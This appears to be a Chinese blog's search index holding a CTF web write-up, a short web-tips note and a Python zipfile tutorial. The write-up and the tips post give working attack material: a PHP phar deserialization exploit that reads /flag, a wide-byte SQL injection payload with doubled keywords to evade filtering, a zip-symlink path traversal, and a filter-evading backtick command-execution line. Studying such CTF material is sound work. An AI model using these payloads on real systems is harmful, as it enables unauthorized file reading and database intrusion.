<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022第五空间网络安全初赛</title>
    <link href="/2022/09/25/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
    <url>/2022/09/25/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="2022第五空间网络安全初赛"><a href="#2022第五空间网络安全初赛" class="headerlink" title="2022第五空间网络安全初赛"></a>2022第五空间网络安全初赛</h1><p>web难度不大，都被打烂了，是我太菜了。</p><h2 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述：<br>一个简单的图床上传<br></code></pre></td></tr></table></figure><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phar反序列化<br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Valid_ext</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;ext = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Valid_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">start</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image already exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">elseif</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;ext, <span class="hljs-variable">$this</span>-&gt;Valid_ext))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Only Image Can Be Uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Upload succsess!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">check_img</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img_name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;img_name = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_name&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">img_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;img_name))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image not exsists&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>file_exists确认一下flag，就构造phar反序列化利用wakeup进行文件读取</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;exp.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传别忘了改后缀名，接着</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?img_name=phar:<span class="hljs-regexp">//u</span>pload/gg.jpg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106457.png" alt="image-20220925110513212"></p><h2 id="5-easylogin"><a href="#5-easylogin" class="headerlink" title="5_easylogin"></a>5_easylogin</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">题目描述：<br>IP地址：<span class="hljs-number">39</span>.<span class="hljs-number">105</span>.<span class="hljs-number">13</span>.<span class="hljs-number">61</span><br>端口：<span class="hljs-number">31088</span><br>题目提示：<br><span class="hljs-number">123.57.19.238:31088</span><br></code></pre></td></tr></table></figure><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">宽字节注入+双写绕过+<span class="hljs-built_in">md5</span>比较<br></code></pre></td></tr></table></figure><p><a href="http://123.57.19.238:31088/login.php">http://123.57.19.238:31088/login.php</a></p><p>赛后复现的（赛后公共靶机没关，趁机复现了一下，360真好），md5比较当时没想到。。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=<span class="hljs-number">1</span>%df&#x27;/**/uniunionon/**/seleselectct/**/1,version(),0x<span class="hljs-number">63346361343233</span><span class="hljs-number">38613062393233</span><span class="hljs-number">38323064636335</span><span class="hljs-number">30396136663735</span><span class="hljs-number">38343962</span>%23&amp;password=1<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106826.png" alt="image-20220925110456913"></p><p>查啥都给flag。</p><p>第三个字段&#x3D;MD5($_POST[password])。</p><h2 id="sakana-reveage"><a href="#sakana-reveage" class="headerlink" title="sakana_reveage"></a>sakana_reveage</h2><p>找到原题：(<a href="https://ctftime.org/writeup/35410">https://ctftime.org/writeup/35410</a>)</p><p>照着复现就行，绑定一个指向flag的软链接在zip上，再绑定图片，获取图片的base上传。</p><p>构造路径穿越</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tmp/</span>sakanas.zip.zip<br></code></pre></td></tr></table></figure><p>上传后选择上传压缩包功能，使其报错，上传的zip压缩包就会被解压，接着就可以访问软链接得到flag内容。</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第五空间</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web浅记</title>
    <link href="/2022/09/18/web%E6%B5%85%E8%AE%B0/"/>
    <url>/2022/09/18/web%E6%B5%85%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>记得比较杂，一些web的小的细节。</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>echo命令执行系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span>`nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.p?p`;<br></code></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>文件包含include()，include可以无括号包含</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>浅记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_zipfile</title>
    <link href="/2022/09/18/python-zipfile/"/>
    <url>/2022/09/18/python-zipfile/</url>
    
    <content type="html"><![CDATA[<h2 id="python-Zipfile库"><a href="#python-Zipfile库" class="headerlink" title="python_Zipfile库"></a>python_Zipfile库</h2><p>因为近期nepCTF2022和练习都碰到了压缩包套娃的题目，写了两个脚本，在这里记录一下zipfile的学习。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>标准库zipfile，可以用来处理压缩文件。<br>zipfile是一个用来压缩文件和解压缩文件的模块，它有两个常用的类，分别是ZipFile和ZipInfo。<br>其中ZipFile是主要的类，用来创建和读取zip文件，而ZipInfo是存储的zip文件的每个文件的信息的。</p><h2 id="ZipFile对象"><a href="#ZipFile对象" class="headerlink" title="ZipFile对象"></a>ZipFile对象</h2><p>ZipFile 对象在概念上与 File 对象相似。<br><strong>官方文档定义：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">打开一个 ZIP 文件，file 为一个指向文件的路径（字符串），一个类文件对象或者一个 path-like <span class="hljs-built_in">object</span>。<br>形参 mode 应当为 <span class="hljs-string">&#x27;r&#x27;</span> 来读取一个存在的文件，<span class="hljs-string">&#x27;w&#x27;</span> 来截断并写入新的文件， <span class="hljs-string">&#x27;a&#x27;</span> 来添加到一个存在的文件，或者 <span class="hljs-string">&#x27;x&#x27;</span> 来仅新建并写入新的文件。如果 mode 为 <span class="hljs-string">&#x27;x&#x27;</span> 并且 file 指向已经存在的文件，则抛出 FileExistsError。如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 且 file 为已存在的文件，则格外的文件将被加入。如果 file 不指向 ZIP 文件，之后一个新的 ZIP 归档将被追加为此文件。这是为了将 ZIP 归档添加到另一个文件（例如 python.exe）。如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 并且文件不存在， 则会新建。如果 mode 为 <span class="hljs-string">&#x27;r&#x27;</span> 或 <span class="hljs-string">&#x27;a&#x27;</span>， 则文件应当可定位。<br></code></pre></td></tr></table></figure><h2 id="ZipInfo对象"><a href="#ZipInfo对象" class="headerlink" title="ZipInfo对象"></a>ZipInfo对象</h2><p><strong>通过ZipFile的getinfo方法得到ZipInfo对象。</strong></p><p>ZipFile.getinfo(name) 方法返回的是一个ZipInfo对象，表示zip文档中相应文件的信息。它支持如下属性：</p><p>ZipInfo.filename： 获取文件名称。</p><p>ZipInfo.date_time： 获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type： 压缩类型。</p><p>ZipInfo.comment： 文档说明。</p><p>ZipInfo.extr： 扩展项数据。</p><p>ZipInfo.create_system： 获取创建该zip文档的系统。</p><p>ZipInfo.create_version： 获取 创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_version： 获取 解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved： 预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits： zip标志位。</p><p>ZipInfo.volume： 文件头的卷标。</p><p>ZipInfo.internal_attr： 内部属性。</p><p>ZipInfo.external_attr： 外部属性。</p><p>ZipInfo.header_offset： 文件头偏移位。</p><p>ZipInfo.CRC： 未压缩文件的CRC-32。</p><p>ZipInfo.compress_size： 获取压缩后的大小。</p><p>ZipInfo.file_size： 获取未压缩的文件大小。<br>ZipInfo相关属性</p><p>ZipInfo.filename        获取文件名称。</p><p>ZipInfo.date_time       获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type   压缩类型。</p><p>ZipInfo.comment         文档说明。</p><p>ZipInfo.extr            扩展项数据。</p><p>ZipInfo.create_system   获取创建该zip文档的系统。</p><p>ZipInfo.create_version  获取、创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_versio  获取、解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved        预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits       zip标志位。</p><p>ZipInfo.volume          文件头的卷标。</p><p>ZipInfo.internal_attr   内部属性。</p><p>ZipInfo.external_attr   外部属性。</p><p>ZipInfo.header_offset   文件头偏移位。</p><p>ZipInfo.CRC             未压缩文件的CRC-32。</p><p>ZipInfo.compress_size   获取压缩后的大小。</p><p>ZipInfo.file_size       获取未压缩的文件大小</p><h2 id="1-创建一个-ZipFile-对象"><a href="#1-创建一个-ZipFile-对象" class="headerlink" title="1.创建一个 ZipFile 对象"></a>1.创建一个 ZipFile 对象</h2><p>要创建一个 ZipFile对象，就调用 zipfile.ZipFile()函数，向它传入一个字符串，表示.zip文件的文件名。请注意，zipfile 是 Python 模块的名称，ZipFile()是函数的名称。ZipFile 的构造方法有两个参数，第一个参数是必选参数，接受一个字符串格式的压缩包名称，第二个参数为<strong>可选</strong>参数，表示打开模式，类似于文件操作，有r&#x2F;w&#x2F;a三种模式，分别代表读、写、添加，默认为r，即读模式。压缩使用w，解压缩使用r。</p><p>mode可以省略<br>压缩需要把mode改为‘w’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br></code></pre></td></tr></table></figure><p>解压需要把mode改为‘r’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="2-添加压缩文件-or-选择解压文件"><a href="#2-添加压缩文件-or-选择解压文件" class="headerlink" title="2.添加压缩文件 or 选择解压文件"></a>2.添加压缩文件 or 选择解压文件</h2><h3 id="需要使用的方法"><a href="#需要使用的方法" class="headerlink" title="需要使用的方法"></a>需要使用的方法</h3><p> ZipFile.extract(member, path&#x3D;None, pwd&#x3D;None)¶</p><pre><code class="hljs">从归档中提取出一个成员放入当前工作目录；member 必须为成员的完整名称或 ZipInfo 对象。 成员的文件信息会尽可能精确地被提取。 path 指定一个要提取到的不同目录。 member 可以是一个文件名或 ZipInfo 对象。 pwd 是用于解密文件的密码。</code></pre><p> ZipFile.extractall(path&#x3D;None, members&#x3D;None, pwd&#x3D;None)</p><pre><code class="hljs">从归档中提取出所有成员放入当前工作目录。 path 指定一个要提取到的不同目录。 members 为可选项且必须为 namelist() 所返回列表的一个子集。 pwd 是用于解密文件的密码。</code></pre><p> ZipFile.write(filename, arcname&#x3D;None, compress_type&#x3D;None, compresslevel&#x3D;None)</p><pre><code class="hljs">将名为 filename 的文件写入归档，给予的归档名为 arcname (默认情况下将与 filename 一致，但是不带驱动器盘符并会移除开头的路径分隔符)。 compress_type 如果给出，它将覆盖作为构造器 compression 形参对于新条目所给出的值。 类似地，compresslevel 如果给出也将覆盖构造器。 归档必须使用 &#39;w&#39;, &#39;x&#39; 或 &#39;a&#39; 模式打开。</code></pre><p>第二个参数是“压缩类型”参数，它告诉计算机使用怎样的算法来压缩文件。可以总是将这个值设置为zipfile.ZIP_DEFLATED（这指定了 deflate 压缩算法，它对各种类型的数据都很有效）。</p><p>ZipFile.close()</p><pre><code class="hljs">关闭归档文件。 你必须在退出程序之前调用 close() 否则将不会写入关键记录数据。</code></pre><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>写入压缩文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.write(<span class="hljs-string">r&quot;../test.py&quot;</span>)<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><p>解压文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.extractall()//解压所有文件<br>zfile.extract(<span class="hljs-string">r&quot;test.py&quot;</span>)//解压指定文件<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><h2 id="3-其他常见方法"><a href="#3-其他常见方法" class="headerlink" title="3.其他常见方法"></a>3.其他常见方法</h2><p>ZipFile.getinfo(name)</p><pre><code class="hljs">返回一个 ZipInfo 对象，其中包含有关归档成员 name 的信息。 针对一个目前并不包含于归档中的名称调用 getinfo() 将会引发 KeyError。</code></pre><p>ZipFile.infolist()</p><pre><code class="hljs">返回一个列表，其中包含每个归档成员的 ZipInfo 对象。 如果是打开一个现有归档则这些对象的排列顺序与它们对应条目在磁盘上的实际 ZIP 文件中的顺序一致。</code></pre><p>ZipFile.namelist()</p><pre><code class="hljs">返回按名称排序的归档成员列表（也就是压缩包里的文件名）。</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2">https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2</a></p><p><a href="https://www.cnblogs.com/wangylblog/p/13925894.html">https://www.cnblogs.com/wangylblog/p/13925894.html</a></p><p><a href="https://blog.csdn.net/sinat_38682860/article/details/114176182">https://blog.csdn.net/sinat_38682860/article/details/114176182</a></p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>脚本</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
